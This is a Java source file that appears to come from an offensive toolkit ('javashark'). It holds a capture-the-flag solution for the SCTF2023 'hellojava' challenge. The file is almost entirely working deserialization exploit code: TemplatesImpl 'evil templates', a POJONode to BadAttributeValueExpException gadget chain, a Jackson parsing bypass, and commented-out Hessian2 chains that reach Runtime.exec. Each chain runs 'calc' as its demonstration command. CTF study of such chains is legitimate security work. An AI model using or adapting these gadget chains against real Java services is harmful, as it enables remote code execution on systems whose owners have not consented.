package dev.silente.javashark.solution;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.jdk.GSwingLazyValue;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import dev.silente.javashark.utils.TestUtils;

import java.lang.reflect.Method;
import java.util.ArrayList;

public class SCTF2023hellojava {

    public static String bypassJackson(String base64) {
        return "{\"Base64Code\": \"" + base64 + "\", \"\": true}";
    }

    public static String invokeFunction() {
        return "TODO";
    }

    public static byte[] unexpectedSolution() throws Exception {
        TemplatesImpl templates = STemplates.getEvilTemplates("calc");

        Object json = GPOJONode.toString2Getter(templates);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(templates);
        arrayList.add(poc);

        return SerializeUtils.serialize(arrayList);
    }

    public static void main(String[] args) throws Exception {

        // BCEL Code
//        Object exp = GSwingLazyValue.toString2BCELCode(TestUtils.class);
//        byte[] poc = SerializeUtils.hessian2SerializeThrowExpectToString(exp);

//        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
//        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
//        Object exp = GSwingLazyValue.toString2StaticInvoke(
//                "sun.reflect.misc.MethodUtil",
//                "invoke",
//                new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});
//
//        byte[] poc = SerializeUtils.hessian2SerializeThrowExpectToString(exp);
//
//        String code = MiscUtils.base64Encode(poc);
//        System.out.println(MiscUtils.base64Encode(bypassJackson("SilentE").getBytes()));
//        System.out.println(code);

        System.out.println("http://127.0.0.1:8080/" + MiscUtils.base64Encode(bypassJackson("SilentE").getBytes()));
        System.out.println(MiscUtils.base64Encode(unexpectedSolution()));
    }
}
